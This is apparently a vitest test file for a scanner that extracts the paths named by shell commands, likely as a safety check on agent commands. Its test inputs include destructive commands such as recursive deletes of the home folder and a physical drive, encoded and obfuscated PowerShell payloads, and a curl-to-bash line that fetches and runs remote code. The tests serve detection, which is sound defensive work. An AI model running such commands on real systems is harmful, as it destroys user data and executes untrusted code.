/**
 * shellPaths.ts (F242, layer 2): the paths a shell command or an argv names. Pure: every case runs on
 * an injected home map, with literal Windows paths under platform win32 and posix paths under posix,
 * so the Windows-spelled attacks are proved on Linux too. Nothing here touches a disk.
 */
import { describe, expect, it } from 'vitest'
import { endsInNativeProgram, nativeTailStart, scanArgv, scanShellText, type HomeMap, type ShellPath, type ShellScan } from '../../tools/shellPaths.js'

const W: HomeMap = {
  home: 'C:\\Users\\u',
  appData: 'C:\\Users\\u\\AppData\\Roaming',
  localAppData: 'C:\\Users\\u\\AppData\\Local',
  temp: 'C:\\cynco-sandbox\\run1\\tmp',
  scratch: 'C:\\cynco-sandbox\\run1\\scratch',
  user: 'u',
}
const BASE = 'C:\\Users\\u\\proj'
const X: HomeMap = { home: '/home/u', appData: '/home/u/AppData/Roaming', localAppData: '/home/u/AppData/Local', temp: '/sb/run1/tmp', scratch: '/sb/run1/scratch', user: 'u' }
const XBASE = '/work/proj'

const scan = (cmd: string, homes: HomeMap = W, base = BASE): ShellScan => scanShellText(cmd, base, homes, { platform: homes === W ? 'win32' : 'posix' })
// The folder a program is started in (`startedIn`, review 2026-11-23, fourth) has its own tests; the operand
// tables below read the operands only.
const ofOp = (s: ShellScan, ...ops: string[]): ShellPath[] => s.paths.filter(p => ops.includes(p.op) && !p.startedIn)
const pathsOf = (s: ShellScan, ...ops: string[]): string[] => ofOp(s, ...ops).map(p => p.path as string)
const lower = (xs: string[]) => xs.map(x => x.toLowerCase())

describe('home spellings resolve to the injected home (win32)', () => {
  const spellings = [
    '$HOME', '${HOME}', '$env:USERPROFILE', '${env:USERPROFILE}', '$Env:UserProfile', '%USERPROFILE%', '!USERPROFILE!',
    '$env:HOMEDRIVE$env:HOMEPATH', '%HOMEDRIVE%%HOMEPATH%', '~', '(Resolve-Path ~)',
    "[Environment]::GetFolderPath('UserProfile')", '[System.Environment]::GetFolderPath("UserProfile")',
    'Path.home()', 'pathlib.Path.home()', "os.path.expanduser('~')", "os.environ['USERPROFILE']",
    'os.environ.get("HOME")', "os.getenv('USERPROFILE')", 'os.homedir()', "require('os').homedir()",
    "require('os').userInfo().homedir", 'process.env.USERPROFILE', 'C:\\Users\\$env:USERNAME', 'C:\\Users\\%USERNAME%',
  ]
  for (const sp of spellings) {
    it(`Remove-Item -Recurse ${sp}\\.x`, () => {
      const s = scan(`Remove-Item -Recurse ${sp}\\.x`)
      expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u\\.x')
      expect(s.unresolvedMutation).toBeNull()
    })
  }
  it('expanduser("~/.x") is the home plus the tail', () => {
    expect(pathsOf(scan('Remove-Item -Recurse expanduser("~/.x")'), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('in the posix dialect too', () => {
    expect(pathsOf(scan('rm -rf $HOME/.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
  })
})

describe('APPDATA, TEMP and CYNCO_SCRATCH spellings', () => {
  it('APPDATA and LOCALAPPDATA resolve to the injected folders', () => {
    expect(pathsOf(scan('Remove-Item $env:APPDATA\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Roaming\\x'])
    expect(pathsOf(scan('Remove-Item %LOCALAPPDATA%\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Local\\x'])
  })
  for (const sp of ['$env:TEMP', '%TMP%', '[IO.Path]::GetTempPath()', 'tempfile.gettempdir()', 'os.tmpdir()']) {
    it(`${sp} is the injected temp`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\tmp\\x'])
    })
  }
  for (const sp of ['$env:CYNCO_SCRATCH', '%CYNCO_SCRATCH%', '$CYNCO_SCRATCH', "os.environ['CYNCO_SCRATCH']", 'process.env.CYNCO_SCRATCH']) {
    it(`${sp} is the injected scratch, and unreadable when there is none`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\scratch\\x'])
      const none = scan(`Remove-Item ${sp}\\x`, { ...W, scratch: null })
      expect(pathsOf(none, 'delete')).toEqual([])
      expect(none.unresolvedMutation?.op).toBe('delete')
    })
  }
})

describe('absolute forms', () => {
  it('drive, quoted, UNC, device and provider spellings', () => {
    expect(pathsOf(scan('Remove-Item C:\\a\\b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item C:/a/b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item "C:\\a b\\c"'), 'delete')).toEqual(['C:\\a b\\c'])
    expect(pathsOf(scan('Remove-Item \\\\server\\share\\x'), 'delete')).toEqual(['\\\\server\\share\\x'])
    expect(pathsOf(scan('Remove-Item \\\\?\\C:\\a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item \\\\?\\UNC\\s\\sh\\x'), 'delete')).toEqual(['\\\\s\\sh\\x'])
    const dev = scan('Remove-Item \\\\.\\PhysicalDrive0')
    expect(ofOp(dev, 'delete')[0].device).toBe(true)
    expect(pathsOf(scan('Remove-Item file:///C:/a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item FileSystem::C:\\a'), 'delete')).toEqual(['C:\\a'])
  })
  it('the msys form needs a segment after the drive letter; a bare /c is not a drive', () => {
    expect(pathsOf(scan('rm -rf /c/Users/x'), 'delete')).toEqual(['C:\\Users\\x'])
    expect(pathsOf(scan('rm -rf /c'), 'delete')).toEqual(['C:\\c'])
  })
  it('posix: a backslash tail joins a posix anchor, and a drive word is kept as written', () => {
    expect(pathsOf(scan('Remove-Item $env:USERPROFILE\\.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
    expect(pathsOf(scan('Remove-Item C:\\a', X, XBASE), 'delete')).toEqual(['C:\\a'])
  })
})

describe('parent traversal and cd tracking', () => {
  it('resolves against the base and follows cd', () => {
    expect(pathsOf(scan('Remove-Item ..\\..\\.cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\.cynco'])
    expect(pathsOf(scan('cd ..; rm -rf other'), 'delete')).toEqual(['C:\\Users\\u\\other'])
    expect(pathsOf(scan('Set-Location $env:USERPROFILE; Remove-Item .cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
  })
  it('an unreadable cd makes later relative write-class operands unreadable', () => {
    const s = scan('cd $d; Remove-Item x -Recurse')
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
  })
})

describe('wildcards and the quoted-prefix split', () => {
  it('rm -rf ~/.*/ is the home with children', () => {
    const [p] = ofOp(scan('rm -rf ~/.*/'), 'delete')
    expect(p.path).toBe('C:\\Users\\u')
    expect(p.children).toBe(true)
    expect(p.recursive).toBe(true)
  })
  it('Remove-Item .\\build\\* is base\\build with children', () => {
    const [p] = ofOp(scan('Remove-Item .\\build\\*'), 'delete')
    expect(p.path).toBe('C:\\Users\\u\\proj\\build')
    expect(p.children).toBe(true)
  })
  it('"$HOME"/.cynco yields the home and home/.cynco; $env:USERPROFILE\'\\.x\' yields one path', () => {
    expect(pathsOf(scan('rm -rf "$HOME"/.cynco'), 'delete')).toEqual(['C:\\Users\\u', 'C:\\Users\\u\\.cynco'])
    expect(pathsOf(scan("Remove-Item $env:USERPROFILE'\\.x'"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
})

describe('pipeline inheritance', () => {
  it('attack 4: one inherited recursive delete on the home', () => {
    const s = scan('Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u'])
    expect(d[0].inherited).toBe(true)
    expect(d[0].recursive).toBe(true)
  })
  it('find | xargs rm -rf inherits the same way', () => {
    const d = ofOp(scan("find ~ -name '.*' | xargs rm -rf"), 'delete')
    expect(d.map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
  })
  it('a mention is inherited by a mutating verb, and an Out-File with its own target inherits nothing', () => {
    expect(pathsOf(scan('Write-Output ~\\.cynco | Remove-Item -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
    const s = scan('Get-ChildItem ~ | Out-File dots.txt')
    expect(pathsOf(s, 'list')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\dots.txt'])
    expect(pathsOf(s, 'delete')).toEqual([])
  })
  it('a ForEach-Object block takes $_ from the pipeline around it', () => {
    expect(pathsOf(scan('Get-ChildItem ~ -Force | ForEach-Object { Remove-Item $_.FullName -Recurse }'), 'delete')).toEqual(['C:\\Users\\u'])
  })
})

describe('grouped expressions', () => {
  it('a value group handed to a path verb is its operand, joined with +', () => {
    expect(pathsOf(scan("Remove-Item -Recurse ([Environment]::GetFolderPath('UserProfile') + '\\.x')"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
    expect(pathsOf(scan('Remove-Item -Recurse ($env:USERPROFILE)'), 'delete')).toEqual(['C:\\Users\\u'])
  })
  it('a command group is a subexpression: unresolved, with its own paths read', () => {
    const s = scan("Remove-Item (Get-Content $env:USERPROFILE\\list.txt) -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('C:\\Users\\u\\list.txt')
    // `Join-Path` over two words is read as the path it makes (review 2026-11-23, fourth).
    expect(pathsOf(scan("Remove-Item (Join-Path $env:USERPROFILE 'x') -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\x'])
  })
  it('inside an inline program a call argument is not an operand of the call before it', () => {
    const s = scan(`python -c "import os; open('out/x.txt','w').write(os.path.expanduser('~'))"`)
    expect(ofOp(s, 'unclassified')).toEqual([])
  })
})

describe('cmd payloads', () => {
  it('attack 5', () => {
    const s = scan('cmd /c rd /s /q %USERPROFILE%\\.cynco')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u\\.cynco'])
    expect(d[0].recursive).toBe(true)
    expect(d[0].via).toBe('shell>cmd /c')
    expect(s.texts.length).toBeGreaterThan(1)
  })
  it('two deletes in one quoted payload', () => {
    expect(pathsOf(scan('cmd /c "del /q C:\\a\\b.txt & rd /s /q C:\\a"'), 'delete')).toEqual(['C:\\a\\b.txt', 'C:\\a'])
  })
  it('mklink /J gives a link with its target', () => {
    const [l] = ofOp(scan('cmd /c mklink /J link C:\\Users\\x'), 'link')
    expect(l.path).toBe('C:\\Users\\u\\proj\\link')
    expect(l.linkTarget).toBe('C:\\Users\\x')
  })
})

describe('constant propagation (2.M1)', () => {
  it('PowerShell, POSIX, Python and JavaScript bindings name a direct target', () => {
    const ps = scan("$t = 'D:\\Video'; Remove-Item $t -Recurse")
    expect(pathsOf(ps, 'delete')).toEqual(['D:\\Video'])
    expect(ps.unresolvedMutation).toBeNull()
    expect(pathsOf(scan('d=/data/x; rm -rf "$d"', X, XBASE), 'delete')).toEqual(['/data/x'])
    expect(pathsOf(scan(`python -c "p = r'D:\\x'; import shutil; shutil.rmtree(p)"`), 'delete')).toContain('D:\\x')
    expect(pathsOf(scan(`node -e "const p = 'D:/x'; require('fs').rmSync(p, { recursive: true })"`), 'delete')).toContain('D:\\x')
  })
  it('a name assigned twice is each of its values; one from a call is unreadable', () => {
    // Every value the name ever held, whatever the order (review 2026-11-24, seventh, P13: it was unreadable).
    const twice = scan("$t = 'C:\\a'; $t = 'C:\\b'; Remove-Item $t")
    expect(pathsOf(twice, 'delete')).toEqual(['C:\\a', 'C:\\b'])
    expect(twice.unresolvedMutation).toBeNull()
    // One value it cannot read makes the name unreadable.
    expect(scan("$t = 'C:\\a'; $t += 'x'; Remove-Item $t").unresolvedMutation?.op).toBe('delete')
    const call = scan('$t = Get-Content x; Remove-Item $t')
    expect(pathsOf(call, 'delete')).toEqual([])
    expect(call.unresolvedMutation?.op).toBe('delete')
    // An item source bound to a name is the item (review 2026-11-23, fourth).
    expect(pathsOf(scan('$t = Get-Item x; Remove-Item $t'), 'delete')).toEqual(['C:\\Users\\u\\proj\\x'])
  })
  it('an assignment to an anchor name rebinds it', () => {
    const [p] = ofOp(scan("$env:TEMP = 'C:\\x'; Remove-Item $env:TEMP\\* -Recurse"), 'delete')
    expect(p.path).toBe('C:\\x')
    expect(p.children).toBe(true)
  })
  it('every right-hand side is also a mention', () => {
    expect(pathsOf(scan("$t = 'D:\\Video'"), 'mention')).toEqual(['D:\\Video'])
  })
})

describe('the whole-argument rule (2.M1)', () => {
  it('a literal is direct; a method or attribute after it is unresolved', () => {
    const lit = scan(`python -c "import shutil; shutil.rmtree('build')"`)
    expect(pathsOf(lit, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(lit.unresolvedMutation).toBeNull()
    // `Path(...).expanduser()` is the same path, read since the sixth review (2026-11-24).
    const exp = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('~/.cynco').expanduser())"`)
    expect(pathsOf(exp, 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
    expect(exp.unresolvedMutation).toBeNull()
    // `.parent` and `dirname` are read as a climb written after the path (review 2026-11-24, eighth, C1).
    const par = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('.').resolve().parent / '.cynco')"`)
    expect(pathsOf(par, 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
    expect(par.unresolvedMutation).toBeNull()
    // A method the scan does not fold is still unresolved.
    const meth = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('.').resolve().joinpath(x))"`)
    expect(meth.unresolvedMutation?.op).toBe('delete')
  })
  it('os.path.dirname(os.getcwd()) is the parent of the working folder', () => {
    const s = scan(`python -c "import os, shutil; shutil.rmtree(os.path.dirname(os.getcwd()))"`)
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u'])
    expect(s.unresolvedMutation).toBeNull()
    // A climb token beside an unread write still counts it (`dirname` of a name the scan cannot read).
    const u = scan(`python -c "import os, shutil; shutil.rmtree(os.path.dirname(x))"`)
    expect(u.unresolvedMutation?.op).toBe('delete')
    expect(u.parentClimb).toBe(1)
  })
})

describe('inline code', () => {
  it('open(..., "w") is a direct write and no unresolved mutation', () => {
    const s = scan(`python -c "open('out/x.txt','w')"`)
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\out\\x.txt'])
    expect(s.unresolvedMutation).toBeNull()
  })
  it('shutil.copy reads the source and writes the destination; raw strings are unescaped', () => {
    const s = scan(`python -c "import shutil; shutil.copy(r'C:\\a\\b', 'c')"`)
    expect(pathsOf(s, 'read')).toContain('C:\\a\\b')
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\c'])
  })
  it('doubled backslashes are unescaped', () => {
    expect(pathsOf(scan(`python -c "import os; os.remove('C:\\\\a\\\\b')"`), 'delete')).toEqual(['C:\\a\\b'])
  })
  it('a concatenation of values the scan reads is the path it makes (sixth review)', () => {
    const s = scan(`node -e "require('fs').rmSync(require('os').homedir()+'/.x',{recursive:true})"`)
    expect(s.unresolvedMutation).toBeNull()
    expect(pathsOf(s, 'delete')).toContain('C:\\Users\\u\\.x')
  })
})

describe('here-documents and here-strings by consumer (2.M2)', () => {
  const body = "from pathlib import Path\np = Path.home() / '.civkings'\nopen(p, 'w')\nimport shutil\nshutil.rmtree(p2)"
  it('a body fed to an interpreter is code', () => {
    for (const cmd of [`@'\n${body}\n'@ | python -`, `python - <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation?.op).toBe('delete')
      expect(pathsOf(s, 'mention')).toContain('C:\\Users\\u')
    }
  })
  it('the same body written to a file is data', () => {
    for (const cmd of [`@'\n${body}\n'@ | Set-Content src\\save.py`, `cat > x.py <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation).toBeNull()
      expect(ofOp(s, 'mention')).toEqual([])
      expect(s.selfBuilding).toBeNull()
      expect(ofOp(s, 'write').length).toBe(1)
    }
  })
  it('a here-string bound to a name and passed to python -c is code; a computed name is self-building', () => {
    const s = scan(`$code = @'\n${body}\n'@\npython -c $code`)
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(scan('$x = Get-Thing; python -c $x').selfBuilding).toBe('an inline program passed through a variable that cannot be read')
  })
})

describe('names nothing', () => {
  it('echo, Write-Host, Write-Output and printf operands are mentions; a redirect after them is a write', () => {
    for (const v of ['echo', 'Write-Host', 'Write-Output', 'printf']) {
      const s = scan(`${v} C:\\Users\\u\\.cache`)
      expect(pathsOf(s, 'mention')).toEqual(['C:\\Users\\u\\.cache'])
      expect(ofOp(s, 'write', 'delete', 'unclassified')).toEqual([])
    }
    expect(pathsOf(scan('echo x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
  })
})

describe('-EncodedCommand', () => {
  const attack4 = 'Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force'
  const b64 = Buffer.from(attack4, 'utf16le').toString('base64')
  for (const flag of ['-e', '-ec', '-en', '-enc', '-enco', '-EncodedCommand', '-encodedc']) {
    it(`powershell ${flag} decodes into texts and yields the inherited delete`, () => {
      const s = scan(`powershell -NoProfile ${flag} ${b64}`)
      expect(s.texts).toContain(attack4)
      expect(ofOp(s, 'delete').map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
    })
  }
  it('a base64 word that is not text is self-building', () => {
    const junk = Buffer.from([0x00, 0xd8, 0x01, 0x00, 0x02, 0x00, 0x00, 0xdc]).toString('base64')
    expect(scan(`powershell -enc ${junk}`).selfBuilding).toBe('an -EncodedCommand that does not decode to text')
  })
})

describe('self-building markers', () => {
  for (const cmd of ['Invoke-Expression $x', 'iex $x', '[Convert]::FromBase64String($s)', '[scriptblock]::Create($s)',
    'eval "$x"', 'echo aGk= | base64 -d | sh', "&('Rem'+'ove-Item') x",
    `python -c "import base64; exec(base64.b64decode('cHJpbnQoMSk='))"`, `node -e "eval(atob('MQ=='))"`]) {
    it(cmd, () => { expect(scan(cmd).selfBuilding).not.toBeNull() })
  }
  it('a plain eval in python does not', () => {
    expect(scan(`python -c "print(eval('1+1'))"`).selfBuilding).toBeNull()
  })
})

describe('copy, move and redirects', () => {
  it('copy and move operands', () => {
    const cp = scan('Copy-Item C:\\lib\\x.py .\\vendor\\x.py')
    expect(pathsOf(cp, 'read')).toEqual(['C:\\lib\\x.py'])
    expect(pathsOf(cp, 'write')).toEqual(['C:\\Users\\u\\proj\\vendor\\x.py'])
    const mv = scan('Move-Item a.txt C:\\other\\b.txt')
    expect(pathsOf(mv, 'move')).toEqual(['C:\\Users\\u\\proj\\a.txt'])
    expect(pathsOf(mv, 'write')).toEqual(['C:\\other\\b.txt'])
  })
  it('robocopy /MIR makes the destination delete-class', () => {
    const s = scan('robocopy src dst /MIR')
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj\\dst'])
    expect(pathsOf(s, 'read')).toEqual(['C:\\Users\\u\\proj\\src'])
  })
  it('redirect targets are writes, the null devices are nothing', () => {
    expect(pathsOf(scan('python x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x >> out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x 2> err.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\err.txt'])
    for (const cmd of ['python x > $null', 'python x > NUL', 'python x >/dev/null', 'python x 2>&1']) expect(ofOp(scan(cmd), 'write')).toEqual([])
  })
})

describe('program position', () => {
  it('an .exe or extensionless program is not a target', () => {
    for (const cmd of ['& "C:\\Users\\x\\.bun\\bin\\bun.exe" test', 'C:\\Py\\python.exe -m pytest', 'Start-Process C:\\Py\\python.exe -ArgumentList x']) {
      expect(scan(cmd).paths.filter(p => !p.startedIn)).toEqual([])
    }
  })
  it('a script is an exec target; -m names nothing', () => {
    expect(pathsOf(scan('python C:\\a\\tool.py'), 'exec')).toEqual(['C:\\a\\tool.py'])
    expect(pathsOf(scan('.\\run.ps1'), 'exec')).toEqual(['C:\\Users\\u\\proj\\run.ps1'])
    // `-m pytest` is pytest, with its own option table (review 2026-11-24, seventh): its operands are reads.
    expect(scan('python -m pytest tests/').paths.filter(p => !p.startedIn && p.op !== 'read')).toEqual([])
    expect(pathsOf(scan('python -m pytest --basetemp=../.cache'), 'delete')).toEqual(['C:\\Users\\u\\.cache'])
  })
})

describe('git through scanShellText', () => {
  it('-C and the write targets', () => {
    expect(pathsOf(scan('git -C C:\\other commit -m x'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git -C C:\\other log'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git worktree add ..\\wt'), 'write')).toEqual(['C:\\Users\\u\\wt'])
    expect(pathsOf(scan('git init C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git clone . C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git format-patch -o C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git apply C:\\tmp\\p.patch'), 'read')).toEqual(['C:\\tmp\\p.patch'])
    expect(scan('git commit -m "fix ~/.cynco handling"').paths.filter(p => !p.startedIn)).toEqual([])
    expect(scan('git commit -am "~/.cache cleanup"').paths.filter(p => !p.startedIn)).toEqual([])
  })
  it('destructive subcommands set gitDestructive and name their path operands', () => {
    const cases: Array<[string, string[]]> = [
      ['git checkout -- a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git restore a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git rm -r old', ['C:\\Users\\u\\proj\\old']],
      ['git clean -fdx', ['C:\\Users\\u\\proj']],
      ['git stash drop', []],
      ['git stash pop', []],
      ['git reset --hard HEAD~1', []],
      ['git worktree remove ..\\wt', ['C:\\Users\\u\\wt']],
    ]
    for (const [cmd, paths] of cases) {
      const s = scan(cmd)
      expect(s.gitDestructive, cmd).toBe(true)
      expect(pathsOf(s, 'write', 'delete'), cmd).toEqual(paths)
    }
    for (const cmd of ['git stash list', 'git checkout -b x', 'git clean -n']) expect(scan(cmd).gitDestructive, cmd).toBe(false)
  })
  it('git config writes of a setting', () => {
    expect(scan('git config core.fsmonitor "x"').gitConfigWrite).toBe('core.fsmonitor')
    expect(scan('git config --global core.pager x').gitConfigWrite).toBe('core.pager')
    expect(scan('git config --system user.name x').gitConfigWrite).toBe('user.name')
    for (const cmd of ['git config user.name x', 'git config --get core.pager', 'git config -l']) expect(scan(cmd).gitConfigWrite, cmd).toBeNull()
  })
})

describe('scanArgv (2.M3)', () => {
  const argv = (words: string[]) => scanArgv(words, BASE, W, { platform: 'win32' })
  it('no comment handling, no message candidates, no expansion', () => {
    expect(pathsOf(argv(['git', 'diff', 'HEAD', '#', '--output=C:\\out\\x']), 'write')).toEqual(['C:\\out\\x'])
    expect(argv(['git', 'commit', '-m', 'fix # of ~/.cynco']).paths).toEqual([])
    expect(pathsOf(argv(['git', '--work-tree=$HOME', 'status']), 'write')).toEqual(['C:\\Users\\u\\proj\\$HOME'])
    expect(argv(['git', 'commit', '-m', 'git checkout -- x']).gitDestructive).toBe(false)
    expect(argv(['git', 'commit', '-m', 'x']).texts).toEqual([])
  })
})

describe('unclassified operands', () => {
  it('a home dot-folder handed to an unknown program', () => {
    expect(pathsOf(scan('sometool --out $env:USERPROFILE\\.x'), 'unclassified')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('a script and its argument', () => {
    const s = scan('python scripts/scan.py C:\\lib\\site-packages')
    expect(pathsOf(s, 'exec')).toEqual(['C:\\Users\\u\\proj\\scripts\\scan.py'])
    expect(pathsOf(s, 'unclassified')).toEqual(['C:\\lib\\site-packages'])
  })
})

describe('limits', () => {
  it('a text over 1 MiB and a payload nested five deep are faults, not throws', () => {
    expect(scan('x'.repeat(1.1 * 1024 * 1024)).faults.length).toBeGreaterThan(0)
    const nested = 'powershell -Command '.repeat(6) + 'Remove-Item C:\\a'
    expect(scan(nested).faults.some(f => /nested deeper/.test(f))).toBe(true)
  })
  it('513 paths set truncated; with Remove-Item, sawWrite', () => {
    const list = Array.from({ length: 513 }, (_, i) => `C:\\a\\${i}`).join(' ')
    const read = scan(`Get-Content ${list}`)
    expect(read.truncated).toBe('more than 512 paths in one command')
    expect(read.paths.length).toBe(512)
    expect(read.sawWrite).toBe(false)
    expect(scan(`Remove-Item ${list}`).sawWrite).toBe(true)
  })
  it('never throws on garbage', () => {
    for (const g of ['"unbalanced', "'also", "@'", 'powershell -enc QQ', '', '((((', '$(', '<<EOF', '`', '^']) {
      expect(() => scan(g)).not.toThrow()
      expect(() => scanArgv([g], BASE, W)).not.toThrow()
    }
  })
})

describe('the review of 2026-11-23', () => {
  it('a bare drive word is that drive read lexically, never the process folder', () => {
    expect(pathsOf(scan('Remove-Item D: -Recurse'), 'delete')).toEqual(['D:\\'])
    expect(pathsOf(scan('Remove-Item D:Video -Recurse'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('Remove-Item C: -Recurse'), 'delete')).toEqual([BASE])
    expect(pathsOf(scan('Set-Location D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('C:; Remove-Item Video'), 'delete')).toEqual([`${BASE}\\Video`])
    expect(pathsOf(scan('cmd /c "cd /d D:\\ && rd /s /q Video"'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('cmd /c "cd /d src && del *.pyc"'), 'cd')).toEqual([`${BASE}\\src`])
  })
  it('powershell parameters written with a slash are read as with a dash', () => {
    for (const flag of ['/c', '/C', '/Command', '/command']) {
      expect(pathsOf(scan(`powershell ${flag} "Remove-Item D:\\x"`), 'delete'), flag).toEqual(['D:\\x'])
    }
    const b64 = Buffer.from('Remove-Item D:\\x', 'utf16le').toString('base64')
    for (const flag of ['/EncodedCommand', '/enc', '/e', '/ec']) {
      const s = scan(`powershell ${flag} ${b64}`)
      expect(pathsOf(s, 'delete'), flag).toEqual(['D:\\x'])
      expect(s.texts).toContain('Remove-Item D:\\x')
    }
    expect(pathsOf(scan('powershell /File C:\\a\\run.ps1'), 'exec')).toEqual(['C:\\a\\run.ps1'])
  })
  it('a program fed on standard input is scanned when it is written there, and self-building when not', () => {
    expect(pathsOf(scan('echo Remove-Item D:\\x | powershell -'), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("'Remove-Item D:\\x' | powershell -Command -"), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("echo \"import shutil; shutil.rmtree('D:/x')\" | python -"), 'delete')).toEqual(['D:\\x'])
    expect(scan('Get-Content x.ps1 | powershell').selfBuilding).toMatch(/standard input/)
    expect(scan('curl -s https://example.invalid/x.sh | bash').selfBuilding).toMatch(/standard input/)
    expect(scan('echo y | python -m pytest').selfBuilding).toBeNull()
    expect(scan('Get-Content data.txt | python tool.py').selfBuilding).toBeNull()
  })
  it('a parameter followed by a group takes the group, never the next parameter', () => {
    const s = scan("Remove-Item -Path (Resolve-Path 'D:\\Video' | Split-Path) -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('D:\\Video')
    expect(pathsOf(scan("Remove-Item -Path (Join-Path 'D:\\' 'Video') -Recurse"), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('Remove-Item -Path -Recurse'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Path build -Recurse'), 'delete')).toEqual([`${BASE}\\build`])
  })
  it('a value at the head of a pipeline flows down it', () => {
    expect(pathsOf(scan("'D:\\a','D:\\b' | Remove-Item"), 'delete')).toEqual(['D:\\a', 'D:\\b'])
    expect(pathsOf(scan("@('D:\\a') | Remove-Item"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('$env:USERPROFILE | Remove-Item'), 'delete')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % Delete'), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % MoveTo C:\\b'), 'move')).toEqual(['D:\\a'])
    // A content reader sends lines, not the file: the target cannot be read.
    const c = scan('Get-Content list.txt | Remove-Item')
    expect(pathsOf(c, 'delete')).toEqual([])
    expect(c.unresolvedMutation?.op).toBe('delete')
  })
  it("cmd's for loop: the list is a mention, the body is a command read once per element of a literal list", () => {
    const s = scan('for /d %d in (%USERPROFILE%\\.*, D:\\x) do @rd /s /q "%d"')
    expect(lower(pathsOf(s, 'mention'))).toEqual(expect.arrayContaining(['c:\\users\\u', 'd:\\x']))
    // Each element of a literal list is the variable (review 2026-11-23, fourth).
    expect(lower(pathsOf(s, 'delete'))).toEqual(expect.arrayContaining(['c:\\users\\u', 'd:\\x']))
    expect(pathsOf(scan('for /r C:\\src %f in (*.pyc) do del %f'), 'mention')).toContain('C:\\src')
    expect(pathsOf(scan('for %f in (a b) do del %f'), 'delete')).toEqual(['C:\\Users\\u\\proj\\a', 'C:\\Users\\u\\proj\\b'])
    // `/r ROOT` is every item under ROOT (sixth review); a modifier and a list that cannot be read keep the variable unread.
    expect(ofOp(scan('for /r C:\\src %f in (*.pyc) do del %f'), 'delete').map(p => [p.path, p.children])).toEqual([['C:\\src', true]])
